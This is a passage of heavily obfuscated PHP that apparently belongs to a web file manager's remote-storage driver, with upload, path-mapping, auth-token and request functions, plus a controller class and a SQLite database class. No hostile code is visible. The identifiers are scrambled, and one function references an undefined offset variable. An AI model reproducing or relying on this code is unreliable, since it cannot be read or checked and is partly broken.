=> $ÂÕÕÉ¼, $¤Óü[1523] => $‡¦ÜÒ”, $¤Óü[1524] => $æó±ñ¸); $ÀÛ°œ•Â = $this->uploadSend($æ®óæÕÕ, $É•×ˆËá, $ÙÏãÖßó, $Ğ¨öı´ª); $æó±ñ¸++; if (!$ÀÛ°œ•Â) { return !1; } } if (!is_array($ÀÛ°œ•Â) || empty($ÀÛ°œ•Â[$¤Óü[600]])) { return !1; } return $this->pathApiDecode($ÀÛ°œ•Â[$¤Óü[600]]); } private function uploadHashCheck($‘¤ÊÅ‚¼, $™ŸùôË, $¥³æšä) { $×ä¨’‰å =& $_SERVER[áäÒ½¯Ç]; $•¾Ù³Å = IO::hashSimple($™ŸùôË); $ŒÁÅï²¦ = array($×ä¨’‰å[1525] => $×ä¨’‰å[1526], $×ä¨’‰å[1484] => $•¾Ù³Å); $ñ¦÷Ã’ = $this->uploadSend($‘¤ÊÅ‚¼, $×ä¨’‰å[12], $ŒÁÅï²¦, $¥³æšä); $š¡ôù£Ì = _get($ñ¦÷Ã’, $×ä¨’‰å[600], array()); $úê¹ü· = _get($š¡ôù£Ì, $×ä¨’‰å[1527]); if (!is_array($úê¹ü·) || !$úê¹ü·[$×ä¨’‰å[568]]) { return !1; } $ìÄâ¯ùü = IO::hashMd5($™ŸùôË); if ($úê¹ü·[$×ä¨’‰å[568]] != $ìÄâ¯ùü) { return !1; } if ($ñ¦÷Ã’[$×ä¨’‰å[600]][$×ä¨’‰å[1528]]) { $this->uploadChunkSize = $ñ¦÷Ã’[$×ä¨’‰å[600]][$×ä¨’‰å[1528]]; } $ŒÁÅï²¦ = array($×ä¨’‰å[1525] => $×ä¨’‰å[1529], $×ä¨’‰å[1485] => $ìÄâ¯ùü, $×ä¨’‰å[1484] => $•¾Ù³Å); $ñ¦÷Ã’ = $this->uploadSend($‘¤ÊÅ‚¼, $×ä¨’‰å[12], $ŒÁÅï²¦, $¥³æšä); if (!is_array($ñ¦÷Ã’) || empty($ñ¦÷Ã’[$×ä¨’‰å[600]])) { return !1; } return $this->pathApiDecode($ñ¦÷Ã’[$×ä¨’‰å[600]]); } private function uploadSend($Ââ—á¨, $Ò¨œ…«î, $ ¡¾÷², $Öì¥›§‰ = '') { $’Îú†“á =& $_SERVER[áäÒ½¯Ç]; $ ¡¾÷²[$’Îú†“á[32]] = get_path_this($Ââ—á¨); $ ¡¾÷²[$’Îú†“á[87]] = $this->pathApiEncode(get_path_father($Ââ—á¨)); if ($Öì¥›§‰) { $ ¡¾÷²[$’Îú†“á[1530]] = $Öì¥›§‰; } if ($Ò¨œ…«î) { $ ¡¾÷²[$’Îú†“á[241]] = $’Îú†“á[1345] . $Ò¨œ…«î; } return $this->requestSend($’Îú†“á[1520], $ ¡¾÷²); } protected function pathApiEncode($ã¤èê‚ç) { $èƒö•Çé =& $_SERVER[áäÒ½¯Ç]; $µ½ª«º¦ = $this->_config[$èƒö•Çé[1503]]; $¦ş¾Í³ = strlen($µ½ª«º¦); if (substr($ã¤èê‚ç, 0, $¦ş¾Í³) == $µ½ª«º¦) { return $ã¤èê‚ç; } return $µ½ª«º¦ . ltrim($ã¤èê‚ç, $èƒö•Çé[8]); } protected function pathApiDecode($ƒ‚¬´Ê™) { $Ûï£œ¦ =& $_SERVER[áäÒ½¯Ç]; $øÓ­ÕÖ­ = $this->_config[$Ûï£œ¦[1503]]; $·ÑÏ±“Á = strlen($øÓ­ÕÖ­); if (substr($ƒ‚¬´Ê™, 0, $·ÑÏ±“Á) !== $øÓ­ÕÖ­) { return $ƒ‚¬´Ê™; } return $this->_config[$Ûï£œ¦[1303]] . ltrim(substr($ƒ‚¬´Ê™, $·ÑÏ±“Á), $Ûï£œ¦[8]); } private function pathInfoParse(&$—„Ç¹×Ğ) { $¸¬¢©Ğ =& $_SERVER[áäÒ½¯Ç]; $óµ·œ› = $this->_config; $ì²ÃÌµ = $óµ·œ›[$¸¬¢©Ğ[581]]; if (!$—„Ç¹×Ğ || !is_array($—„Ç¹×Ğ)) { return $—„Ç¹×Ğ; } static $šö’¬… = array(); $±˜šù = $šö’¬…[$ì²ÃÌµ[$¸¬¢©Ğ[693]]]; if (!is_array($±˜šù)) { $À¤ƒó’ = LNG($¸¬¢©Ğ[1531]); $À»ÃÈ™£ = $óµ·œ›[$¸¬¢©Ğ[585]][$¸¬¢©Ğ[90]]; $²¹§Öñ = parse_url($óµ·œ›[$¸¬¢©Ğ[585]][$¸¬¢©Ğ[1532]]); $ËÎ¤Æù· = $óµ·œ›[$¸¬¢©Ğ[585]][$¸¬¢©Ğ[1533]]; $±˜šù = array($¸¬¢©Ğ[1534] => $À»ÃÈ™£[$¸¬¢©Ğ[32]] . $¸¬¢©Ğ[1016] . $ËÎ¤Æù· . $¸¬¢©Ğ[1345] . $²¹§Öñ[$¸¬¢©Ğ[207]] . $¸¬¢©Ğ[1018], $¸¬¢©Ğ[1535] => $À¤ƒó’ . $¸¬¢©Ğ[1082] . $óµ·œ›[$¸¬¢©Ğ[585]][$¸¬¢©Ğ[1532]] . $¸¬¢©Ğ[1536] . LNG($¸¬¢©Ğ[1537]) . $¸¬¢©Ğ[1082] . $ËÎ¤Æù·, $¸¬¢©Ğ[1538] => LNG($¸¬¢©Ğ[1539]) . $¸¬¢©Ğ[1540] . $óµ·œ›[$¸¬¢©Ğ[585]][$¸¬¢©Ğ[1532]] . $¸¬¢©Ğ[221] . LNG($¸¬¢©Ğ[1541]) . $¸¬¢©Ğ[1540] . $À»ÃÈ™£[$¸¬¢©Ğ[607]], $¸¬¢©Ğ[1533] => array($¸¬¢©Ğ[32] => $ËÎ¤Æù·, $¸¬¢©Ğ[1542] => $¸¬¢©Ğ[1543]), $¸¬¢©Ğ[1544] => Action($¸¬¢©Ğ[1489])->shareTargetMake($ì²ÃÌµ[$¸¬¢©Ğ[1500]])); $šö’¬…[$ì²ÃÌµ[$¸¬¢©Ğ[693]]] = $±˜šù; } unset($—„Ç¹×Ğ[$¸¬¢©Ğ[192]]); unset($—„Ç¹×Ğ[$¸¬¢©Ğ[609]]); unset($—„Ç¹×Ğ[$¸¬¢©Ğ[189]]); unset($—„Ç¹×Ğ[$¸¬¢©Ğ[594]]); $—„Ç¹×Ğ[$¸¬¢©Ğ[1545]] = !0; $—„Ç¹×Ğ[$¸¬¢©Ğ[243]] = $óµ·œ›[$¸¬¢©Ğ[1507]]; $—„Ç¹×Ğ[$¸¬¢©Ğ[244]] = $óµ·œ›[$¸¬¢©Ğ[1508]]; $—„Ç¹×Ğ[$¸¬¢©Ğ[507]] = $óµ·œ›[$¸¬¢©Ğ[1505]]; $—„Ç¹×Ğ[$¸¬¢©Ğ[1533]] = $±˜šù[$¸¬¢©Ğ[1533]]; $—„Ç¹×Ğ[$¸¬¢©Ğ[1546]] = $ì²ÃÌµ[$¸¬¢©Ğ[242]]; $—„Ç¹×Ğ[$¸¬¢©Ğ[1547]] = $ì²ÃÌµ[$¸¬¢©Ğ[88]]; $—„Ç¹×Ğ[$¸¬¢©Ğ[1548]] = $±˜šù[$¸¬¢©Ğ[1538]]; $—„Ç¹×Ğ[$¸¬¢©Ğ[1544]] = $±˜šù[$¸¬¢©Ğ[1544]]; $Æãı‹Â = explode($¸¬¢©Ğ[8], trim($—„Ç¹×Ğ[$¸¬¢©Ğ[607]], $¸¬¢©Ğ[8])); $Æãı‹Â[0] = $±˜šù[$¸¬¢©Ğ[1534]]; $—„Ç¹×Ğ[$¸¬¢©Ğ[607]] = implode($¸¬¢©Ğ[8], $Æãı‹Â); if (count($Æãı‹Â) > 1) { unset($—„Ç¹×Ğ[$¸¬¢©Ğ[1544]]); } if (count($Æãı‹Â) == 1) { if ($—„Ç¹×Ğ[$¸¬¢©Ğ[33]] == $¸¬¢©Ğ[78]) { $—„Ç¹×Ğ[$¸¬¢©Ğ[32]] = $±˜šù[$¸¬¢©Ğ[1534]]; } array_set_value($—„Ç¹×Ğ, $¸¬¢©Ğ[1549], $±˜šù[$¸¬¢©Ğ[1535]]); } $íÏöÅûë = array($¸¬¢©Ğ[1550], $¸¬¢©Ğ[1469], $¸¬¢©Ğ[1551], $¸¬¢©Ğ[1552]); foreach ($íÏöÅûë as $µŒøÙìø) { $¸½•‘æ› = $this->urlAuto(_get($—„Ç¹×Ğ, $µŒøÙìø, $¸¬¢©Ğ[12])); if ($¸½•‘æ›) { array_set_value($—„Ç¹×Ğ, $µŒøÙìø, $¸½•‘æ›); } } } private function _info($éÓ¨òè¥, $®øúÏóö = false) { $¿€šÏíŒ =& $_SERVER[áäÒ½¯Ç]; $®¡Ê÷¦ = $this->_config; if (!$®¡Ê÷¦) { return !1; } static $Âƒºñ€Ğ = array(); if (isset($Âƒºñ€Ğ[$éÓ¨òè¥]) && is_array($Âƒºñ€Ğ[$éÓ¨òè¥])) { return $Âƒºñ€Ğ[$éÓ¨òè¥]; } if ((!$éÓ¨òè¥ || !trim($éÓ¨òè¥, $¿€šÏíŒ[8])) && !$®øúÏóö) { $æ¼ó¨¨Û = $®¡Ê÷¦[$¿€šÏíŒ[585]][$¿€šÏíŒ[90]]; if (!$æ¼ó¨¨Û) { return !1; } $æ¼ó¨¨Û[$¿€šÏíŒ[607]] = $¿€šÏíŒ[12]; $æ¼ó¨¨Û[$¿€šÏíŒ[87]] = $®¡Ê÷¦[$¿€šÏíŒ[1303]]; $this->pathInfoParse($æ¼ó¨¨Û); return $æ¼ó¨¨Û; } $‹½ÛŠîµ = $this->request($¿€šÏíŒ[1553], array($éÓ¨òè¥, $®øúÏóö)); $Âƒºñ€Ğ[$éÓ¨òè¥] = $‹½ÛŠîµ; return $‹½ÛŠîµ; } private function _fileSubstr($ªĞ¨€”ü, $û»Ë“Ÿ‡ = 0, $ÊÄÕäÒë = -1) { $ÃÌ–ªÃÄ =& $_SERVER[áäÒ½¯Ç]; $üĞªÑ€ = $this->_fileLink($ªĞ¨€”ü); if (!$üĞªÑ€) { return !1; } $ÑÀÅÎ©Ğ = !1; if ($ÊÄÕäÒë > 0) { $¾¡¶Æ†Ë = $Ô’…ô™ç + $ÊÄÕäÒë - 1; $ÑÀÅÎ©Ğ = array($ÃÌ–ªÃÄ[1554] . $Ô’…ô™ç . $ÃÌ–ªÃÄ[482] . $¾¡¶Æ†Ë); } $·ïËÃç¶ = url_request($üĞªÑ€, $ÃÌ–ªÃÄ[1555], !1, $ÑÀÅÎ©Ğ); return $·ïËÃç¶[$ÃÌ–ªÃÄ[852]] ? $·ïËÃç¶[$ÃÌ–ªÃÄ[1339]] : !1; } private function _download($îÚ…Œ“, $„ı†ûÂÄ) { $ø¾î Áô = $this->_fileLink($îÚ…Œ“); if (!$ø¾î Áô) { return !1; } Downloader::start($ø¾î Áô, $„ı†ûÂÄ); return $„ı†ûÂÄ; } private function _fileLink($‰øÚ‰Ò‹, $ü±ˆü— = '') { $—œÌ–ò¨ =& $_SERVER[áäÒ½¯Ç]; $Ñ§€ÚÁ = $this->pathApiEncode($‰øÚ‰Ò‹); return $this->requestMakeUrl($—œÌ–ò¨[1556], array($—œÌ–ò¨[87] => $Ñ§€ÚÁ)) . $ü±ˆü—; } private function urlAuto($“ÊŠœÌ¶) { $òó—°ñ‘ =& $_SERVER[áäÒ½¯Ç]; if (!$“ÊŠœÌ¶) { return $“ÊŠœÌ¶; } $œß¼ì´û = parse_url($“ÊŠœÌ¶); $‡ˆå›¦ = $“ÊŠœÌ¶; if ($this->_config[$òó—°ñ‘[1506]] && $œß¼ì´û[$òó—°ñ‘[206]] == $òó—°ñ‘[150] && Input::check($œß¼ì´û[$òó—°ñ‘[1557]], $òó—°ñ‘[1558])) { $“ÊŠœÌ¶ = $òó—°ñ‘[228] . substr($“ÊŠœÌ¶, 7); } $ã©®¾Ó¬ = $òó—°ñ‘[1559] . rawurlencode(rtrim($this->config[$òó—°ñ‘[1503]], $òó—°ñ‘[8])); if (strstr($“ÊŠœÌ¶, $ã©®¾Ó¬)) { $ıØÕ­Ó” = strstr($“ÊŠœÌ¶, $òó—°ñ‘[76]) ? $òó—°ñ‘[295] : $òó—°ñ‘[76]; $“ÊŠœÌ¶ = $“ÊŠœÌ¶ . $ıØÕ­Ó” . $òó—°ñ‘[1560] . $this->authToken; } return $“ÊŠœÌ¶; } private function request($Ã¿ê¿Üœ, $ØåŞıÚÙ) { $î‡ÆòØõ =& $_SERVER[áäÒ½¯Ç]; if (!is_array($ØåŞıÚÙ)) { $ØåŞıÚÙ = array(); } for ($Ç¦Éûİó = 0; $Ç¦Éûİó < 4; $Ç¦Éûİó++) { if (!isset($ØåŞıÚÙ[$Ç¦Éûİó])) { $ØåŞıÚÙ[$Ç¦Éûİó] = $î‡ÆòØõ[12]; } } $‡ñ»Å›Ô = array($î‡ÆòØõ[1553] => array($î‡ÆòØõ[1561] => $î‡ÆòØõ[1553], $î‡ÆòØõ[1562] => $î‡ÆòØõ[1563], $î‡ÆòØõ[1564] => $î‡ÆòØõ[87], $î‡ÆòØõ[1302] => array($î‡ÆòØõ[1565] => array(array($î‡ÆòØõ[87] => $ØåŞıÚÙ[0])), $î‡ÆòØõ[1566] => $ØåŞıÚÙ[1] ? $î‡ÆòØõ[91] : $î‡ÆòØõ[12])), $î‡ÆòØõ[1515] => array($î‡ÆòØõ[1561] => $î‡ÆòØõ[1567], $î‡ÆòØõ[1562] => $î‡ÆòØõ[87], $î‡ÆòØõ[1564] => $î‡ÆòØõ[1568], $î‡ÆòØõ[1302] => array($î‡ÆòØõ[87] => $ØåŞıÚÙ[0])), $î‡ÆòØõ[1569] => array($î‡ÆòØõ[1561] => $î‡ÆòØõ[1570], $î‡ÆòØõ[1562] => $î‡ÆòØõ[87], $î‡ÆòØõ[1564] => $î‡ÆòØõ[1571], $î‡ÆòØõ[1302] => array($î‡ÆòØõ[87] => $ØåŞıÚÙ[0])), $î‡ÆòØõ[1516] => array($î‡ÆòØõ[1561] => $î‡ÆòØõ[1572], $î‡ÆòØõ[1562] => $î‡ÆòØõ[87], $î‡ÆòØõ[1573] => $î‡ÆòØõ[1574], $î‡ÆòØõ[1302] => array($î‡ÆòØõ[87] => $ØåŞıÚÙ[0], $î‡ÆòØõ[169] => $ØåŞıÚÙ[1])), $î‡ÆòØõ[1492] => array($î‡ÆòØõ[1561] => $î‡ÆòØõ[1492], $î‡ÆòØõ[1562] => $î‡ÆòØõ[87], $î‡ÆòØõ[1573] => $î‡ÆòØõ[600], $î‡ÆòØõ[1302] => array($î‡ÆòØõ[87] => $ØåŞıÚÙ[0], $î‡ÆòØõ[169] => $ØåŞıÚÙ[1], $î‡ÆòØõ[1530] => $ØåŞıÚÙ[2])), $î‡ÆòØõ[1493] => array($î‡ÆòØõ[1561] => $î‡ÆòØõ[1493], $î‡ÆòØõ[1562] => $î‡ÆòØõ[87], $î‡ÆòØõ[1573] => $î‡ÆòØõ[600], $î‡ÆòØõ[1302] => array($î‡ÆòØõ[87] => $ØåŞıÚÙ[0], $î‡ÆòØõ[1530] => $ØåŞıÚÙ[2])), $î‡ÆòØõ[646] => array($î‡ÆòØõ[1561] => $î‡ÆòØõ[1575], $î‡ÆòØõ[1562] => $î‡ÆòØõ[1576], $î‡ÆòØõ[1573] => $î‡ÆòØõ[1577], $î‡ÆòØõ[1302] => array($î‡ÆòØõ[1565] => array(array($î‡ÆòØõ[87] => $ØåŞıÚÙ[0])), $î‡ÆòØõ[87] => $ØåŞıÚÙ[1], $î‡ÆòØõ[1530] => $ØåŞıÚÙ[2])), $î‡ÆòØõ[648] => array($î‡ÆòØõ[1561] => $î‡ÆòØõ[1578], $î‡ÆòØõ[1562] => $î‡ÆòØõ[1576], $î‡ÆòØõ[1573] => $î‡ÆòØõ[1577], $î‡ÆòØõ[1302] => array($î‡ÆòØõ[1565] => array(array($î‡ÆòØõ[87] => $ØåŞıÚÙ[0])), $î‡ÆòØõ[87] => $ØåŞıÚÙ[1], $î‡ÆòØõ[1530] => $ØåŞıÚÙ[2])), $î‡ÆòØõ[1280] => array($î‡ÆòØõ[1561] => $î‡ÆòØõ[1579], $î‡ÆòØõ[1562] => $î‡ÆòØõ[1563], $î‡ÆòØõ[1564] => $î‡ÆòØõ[87], $î‡ÆòØõ[1302] => array($î‡ÆòØõ[1565] => array(array($î‡ÆòØõ[87] => $ØåŞıÚÙ[0])))), $î‡ÆòØõ[1496] => array($î‡ÆòØõ[1561] => $î‡ÆòØõ[1580], $î‡ÆòØõ[1562] => $î‡ÆòØõ[87], $î‡ÆòØõ[1573] => $î‡ÆòØõ[600], $î‡ÆòØõ[1302] => array($î‡ÆòØõ[87] => $ØåŞıÚÙ[0], $î‡ÆòØõ[1581] => $ØåŞıÚÙ[1])), $î‡ÆòØõ[108] => array($î‡ÆòØõ[1561] => $î‡ÆòØõ[1520], $î‡ÆòØõ[1562] => $î‡ÆòØõ[87], $î‡ÆòØõ[1573] => $î‡ÆòØõ[600], $î‡ÆòØõ[1302] => array($î‡ÆòØõ[87] => get_path_father($ØåŞıÚÙ[0]), $î‡ÆòØõ[241] => $ØåŞıÚÙ[1] ? $î‡ÆòØõ[1345] . $ØåŞıÚÙ[1] : $î‡ÆòØõ[12], $î‡ÆòØõ[32] => get_path_this($ØåŞıÚÙ[0]), $î‡ÆòØõ[1530] => $ØåŞıÚÙ[2]))); $”Ì·¶£™ = $‡ñ»Å›Ô[$Ã¿ê¿Üœ]; if (!$”Ì·¶£™) { return !1; } $ùªóÑ¶Û = $”Ì·¶£™[$î‡ÆòØõ[1302]]; $Ûš¬ï = explode($î‡ÆòØõ[50], $”Ì·¶£™[$î‡ÆòØõ[1562]]); foreach ($Ûš¬ï as $šê†ÁÜ ) { $øµ–£€é = $this->pathApiEncode(_get($ùªóÑ¶Û, $šê†ÁÜ )); array_set_value($ùªóÑ¶Û, $šê†ÁÜ , $øµ–£€é); } if ($Ã¿ê¿Üœ == $î‡ÆòØõ[1496] && trim($”Ì·¶£™[$î‡ÆòØõ[1302]][$î‡ÆòØõ[87]], $î‡ÆòØõ[8]) == trim($this->_config[$î‡ÆòØõ[1303]], $î‡ÆòØõ[8])) { return $”Ì·¶£™[$î‡ÆòØõ[1302]][$î‡ÆòØõ[87]]; } $óˆÆÜ÷­ = $this->requestSend($”Ì·¶£™[$î‡ÆòØõ[1561]], $ùªóÑ¶Û); if (!$óˆÆÜ÷­) { return !1; } $«€Ì = $óˆÆÜ÷­[$î‡ÆòØõ[1339]]; if ($”Ì·¶£™[$î‡ÆòØõ[1573]]) { $«€Ì = _get($óˆÆÜ÷­, $”Ì·¶£™[$î‡ÆòØõ[1573]]); } if (is_string($«€Ì) && !$”Ì·¶£™[$î‡ÆòØõ[1564]]) { return $this->pathApiDecode($«€Ì); } if (!is_array($«€Ì) || !$«€Ì) { return $«€Ì; } $¢ÑÆœ‘ù = explode($î‡ÆòØõ[50], $”Ì·¶£™[$î‡ÆòØõ[1564]]); foreach ($¢ÑÆœ‘ù as $šê†ÁÜ ) { $„²¼½Ó = explode($î‡ÆòØõ[10], $šê†ÁÜ ); $ó´¡£ = array_search($î‡ÆòØõ[1582], $„²¼½Ó); if ($ó´¡£ === !1) { $øµ–£€é = $this->pathApiDecode(_get($«€Ì, $šê†ÁÜ )); array_set_value($«€Ì, $šê†ÁÜ , $øµ–£€é); if ($Ã¿ê¿Üœ == $î‡ÆòØõ[1553] && $šê†ÁÜ  == $î‡ÆòØõ[87]) { $this->pathInfoParse($«€Ì); } if ($Ã¿ê¿Üœ == $î‡ÆòØõ[1515] && $šê†ÁÜ  == $î‡ÆòØõ[1583]) { $this->pathInfoParse($«€Ì[$î‡ÆòØõ[1490]]); } if ($Ã¿ê¿Üœ == $î‡ÆòØõ[1515]) { $«€Ì[$î‡ÆòØõ[1584]] = array(); } continue; } $—«é İÒ = implode($î‡ÆòØõ[10], array_slice($„²¼½Ó, $ó´¡£ + 1)); $ª¹ûÅ« = array(); if ($ó´¡£ === 0) { $ª¹ûÅ« =& $«€Ì; } if ($ó´¡£ === 1) { $ª¹ûÅ« =& $«€Ì[$„²¼½Ó[0]]; } if ($ó´¡£ === 2) { $ª¹ûÅ« =& $«€Ì[$„²¼½Ó[0]][$„²¼½Ó[1]]; } foreach ($ª¹ûÅ« as $šê†ÁÜ  => $ïÆÏÔôÍ) { $øµ–£€é = $this->pathApiDecode(_get($ïÆÏÔôÍ, $—«é İÒ)); array_set_value($ª¹ûÅ«[$šê†ÁÜ ], $—«é İÒ, $øµ–£€é); $this->pathInfoParse($ª¹ûÅ«[$šê†ÁÜ ]); } unset($ª¹ûÅ«); } return $«€Ì; } private function requestMakeUrl($¢ÏóèÍë, $Á˜¿Òš¦ = '') { $¿åÌ¦ûí =& $_SERVER[áäÒ½¯Ç]; $ààø÷¬ğ = $this->_config; if (!$this->authToken) { return !1; } $œè…ÇÖ‘ = $this->requestQuery($Á˜¿Òš¦, !0) . $¿åÌ¦ûí[1585] . $this->authToken; $øÌãœÚë = rtrim($ààø÷¬ğ[$¿åÌ¦ûí[585]][$¿åÌ¦ûí[1532]], $¿åÌ¦ûí[8]) . $¿åÌ¦ûí[1586] . $¢ÏóèÍë; return $øÌãœÚë . $¿åÌ¦ûí[1587] . rawurlencode($ààø÷¬ğ[$¿åÌ¦ûí[585]][$¿åÌ¦ûí[1504]]) . $œè…ÇÖ‘; } private function requestAuthToken() { $Äßæ«ğ… =& $_SERVER[áäÒ½¯Ç]; $‚‹„Â»ä = $this->_config; if (!$‚‹„Â»ä) { return !1; } $Á‚áíµÜ = _get($‚‹„Â»ä, $Äßæ«ğ…[1588]); $ ì¹Ì‚² = array_find_by_field($‚‹„Â»ä[$Äßæ«ğ…[585]][$Äßæ«ğ…[1544]], $Äßæ«ğ…[1589], $Á‚áíµÜ); if (!$ ì¹Ì‚²) { return !1; } $á»Şµ” = $ ì¹Ì‚²[$Äßæ«ğ…[1590]] . $Äßæ«ğ…[1591] . $ ì¹Ì‚²[$Äßæ«ğ…[1293]]; $³øÉ¾£Š = $Äßæ«ğ…[1592] . $this->pathParse[$Äßæ«ğ…[492]] . $Äßæ«ğ…[482] . $á»Şµ”; $ø™öäŞÅ = Cache::get($³øÉ¾£Š); if ($ø™öäŞÅ) { return $ø™öäŞÅ; } $ø™öäŞÅ = Mcrypt::encode($á»Şµ”, $Äßæ«ğ…[1593]); Cache::set($³øÉ¾£Š, $ø™öäŞÅ, 3600 * 24 * 60); return $ø™öäŞÅ; } private function requestQuery($Ä‡ØÍØÔ = '', $ß¥Êï• = false) { if (!$Ä‡ØÍØÔ || !is_array($Ä‡ØÍØÔ)) { return $Ä‡ØÍØÔ; } foreach ($Ä‡ØÍØÔ as $ËÃÓº—û => $Ûœ‡Ê¸¢) { if (is_array($Ûœ‡Ê¸¢)) { $Ä‡ØÍØÔ[$ËÃÓº—û] = json_encode($Ûœ‡Ê¸¢); } } return $ß¥Êï• ? $_SERVER[áäÒ½¯Ç][295] . http_build_query($Ä‡ØÍØÔ) : $Ä‡ØÍØÔ; } private function requestSend($ºÚ³æä, $ºõ©´) { $¬Ğ€…½ =& $_SERVER[áäÒ½¯Ç]; $áĞ—˜Šˆ = $this->requestMakeUrl($ºÚ³æä); if (!$áĞ—˜Šˆ) { return !1; } $‡‘Î‘ÂĞ = url_request($áĞ—˜Šˆ, $¬Ğ€…½[298], $this->requestQuery($ºõ©´), !1, !1, !0); $Œª”¯¦’ = $‡‘Î‘ÂĞ[$¬Ğ€…½[1339]]; if (!is_array($Œª”¯¦’) || !$Œª”¯¦’ || !$Œª”¯¦’[$¬Ğ€…½[1349]] || intval($Œª”¯¦’[$¬Ğ€…½[1349]]) > 500) { $¯ €‚£Ş = is_array($Œª”¯¦’) ? $Œª”¯¦’[$¬Ğ€…½[1339]] : $Œª”¯¦’ . $¬Ğ€…½[12]; if (!$‡‘Î‘ÂĞ[$¬Ğ€…½[852]]) { $¯ €‚£Ş .= $¬Ğ€…½[1594] . $‡‘Î‘ÂĞ[$¬Ğ€…½[1349]] . $¬Ğ€…½[176]; } IO::errorTips($¯ €‚£Ş, !1); return !1; } return $Œª”¯¦’; } } goto b’°²¤•íö; A×òéÉ–òİ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ıÏãÉú =& $_SERVER[áäÒ½¯Ç]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ıÏãÉú[6]] =& $config; $this->values[$ıÏãÉú[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ıÏãÉú[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ÊÅÈ²õŸ) { if (1 === func_num_args()) { $this->{$ÊÅÈ²õŸ} = new $ÊÅÈ²õŸ(); } else { $ç•¨¼œ = new ReflectionClass($ÊÅÈ²õŸ); $øùŸ°Ëí = func_get_args(); array_shift($øùŸ°Ëí); $this->{$ÊÅÈ²õŸ} = $ç•¨¼œ->newInstanceArgs($øùŸ°Ëí); } return $this->{$ÊÅÈ²õŸ}; } public function routeBind($‘¢ÒÚïö, $ï·¢ŠÏ, $ñ²ŠŞÆŞ = 3) { $ãûê’óÑ =& $_SERVER[áäÒ½¯Ç]; $ØÚª†¶è = $this->in[$ãûê’óÑ[9]]; $‘¢ÒÚïö = str_replace($ãûê’óÑ[10], $ãûê’óÑ[11], trim(trim($‘¢ÒÚïö, $ãûê’óÑ[8]), $ãûê’óÑ[12])); if (!$‘¢ÒÚïö || count($ØÚª†¶è) <= $ñ²ŠŞÆŞ) { return !1; } $Ş»•Î¬¢ = !0; $éøŸ‰µø = explode($ãûê’óÑ[8], $‘¢ÒÚïö); for ($îˆ›Âğ = 0; $îˆ›Âğ < count($éøŸ‰µø); $îˆ›Âğ++) { if ($éøŸ‰µø[$îˆ›Âğ] != $ØÚª†¶è[$ñ²ŠŞÆŞ + $îˆ›Âğ]) { $Ş»•Î¬¢ = !1; break; } } if (!$Ş»•Î¬¢) { return; } call_user_func_array(array($this, $ï·¢ŠÏ), array()); } public function routeArgs($½ƒœÇ¬á = 3) { $Ş²ø¨ · = $this->in[$_SERVER[áäÒ½¯Ç][9]]; if (count($Ş²ø¨ ·) <= $½ƒœÇ¬á) { return array(); } $ø¹¾Ü¡ = array(); for ($Ñ¡õö¤¡ = $½ƒœÇ¬á; $Ñ¡õö¤¡ < count($Ş²ø¨ ·); $Ñ¡õö¤¡ += 2) { $ø¹¾Ü¡[$Ş²ø¨ ·[$Ñ¡õö¤¡]] = $Ş²ø¨ ·[$Ñ¡õö¤¡ + 1]; $this->in[$Ş²ø¨ ·[$Ñ¡õö¤¡]] = $Ş²ø¨ ·[$Ñ¡õö¤¡ + 1]; } return $ø¹¾Ü¡; } protected function assign($Ñû“Ö”Ì, $£ÍÖÖüï) { $this->values[$Ñû“Ö”Ì] = $£ÍÖÖüï; } protected function display($—¤¹ œ­) { ob_end_clean(); extract($this->values); require $this->tpl . $—¤¹ œ­; } } class DbSqliteBase extends Db { public function __construct($Ïê˜†Èú = '') { $ò„Ÿ­û± =& $_SERVER[áäÒ½¯Ç]; if (!extension_loaded($ò„Ÿ­û±[13])) { think_exception(think_lang($ò„Ÿ­û±[14]) . $ò„Ÿ­û±[15]); } if (!empty($Ïê˜†Èú)) { if (!isset($Ïê˜†Èú[$ò„Ÿ­û±[16]])) { $Ïê˜†Èú[$ò„Ÿ­û±[16]] = 438; } $this->config = $Ïê˜†Èú; if (empty($this->config[$ò„Ÿ­û±[17]])) { $this->config[$ò„Ÿ­û±[17]] = array(); } } } public function connect($‘Í²à = '', $¾Äˆ÷µ® = 0) { $±å¦Ììê =& $_SERVER[áäÒ½¯Ç]; if (!isset($this->linkID[$¾Äˆ÷µ®])) { if (empty($‘Í²à)) { $‘Í²à = $this->config; } $‡ÇÊì = !empty($‘Í²à[$±å¦Ììê[17]][$±å¦Ììê[18]]) ? $‘Í²à[$±å¦Ììê[17]][$±å¦Ììê[18]] : $this->pconnect; $ÛÜ†Î— = $‡ÇÊì ? $±å¦Ììê[19] : $±å¦Ììê[20]; $this->linkID[$¾Äˆ÷µ®] = $ÛÜ†Î—($‘Í²à[$±å¦Ììê[21]], $‘Í²à[$±å¦Ììê[16]]); if (!$this->linkID[$¾Äˆ÷µ®]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¾Äˆ÷µ®], 30000); if (1 != think_config($±å¦Ììê[22])) { unset($this->config); } } return $this->linkID[$¾Äˆ÷µ®]; } public function free() { $this->queryID = null; } public function query($«”›İæ†) { $—¡„äË =& $_SERVER[áäÒ½¯Ç]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $«”›İæ†; if ($this->queryID) { $this->free(); } think_action_status($—¡„äË[23], 1); think_status($—¡„äË[24]); $this->queryID = sqlite_query($this->_linkID, $«”›İæ†); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $áè–İ = $this->getAll(); return $áè–İ; } } public function execute($¯¡ğî¥) { $¬¼Ü­•± =& $_SERVER[áäÒ½¯Ç]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¯¡ğî¥; if ($this->queryID) { $this->free(); } think_action_status($¬¼Ü­•±[25], 1); think_status($¬¼Ü­•±[24]); $†Í°ˆŸ¹ = sqlite_exec($this->_linkID, $¯¡ğî¥); $this->debug(); if (!1 === $†Í°ˆŸ¹) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[áäÒ½¯Ç][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÂşìùïÇ = 